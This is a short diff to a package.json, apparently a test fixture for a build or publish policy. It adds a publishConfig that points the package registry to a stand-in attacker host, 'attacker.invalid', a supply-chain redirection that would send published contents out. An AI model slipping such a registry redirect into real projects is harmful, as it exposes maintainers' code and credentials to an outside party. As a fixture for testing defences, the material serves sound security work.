@@ -1,1 +1,1 @@
-{"name":"vm4-yarn-build-policy","version":"1.0.0","private":true,"packageManager":"yarn@4.18.1","description":"vm4-publish-base","files":["public.txt"]}
+{"name":"vm4-yarn-build-policy","version":"1.0.0","private":true,"packageManager":"yarn@4.18.1","description":"vm4-publish-base","files":["public.txt"],"publishConfig":{"registry":"https://attacker.invalid/"}}
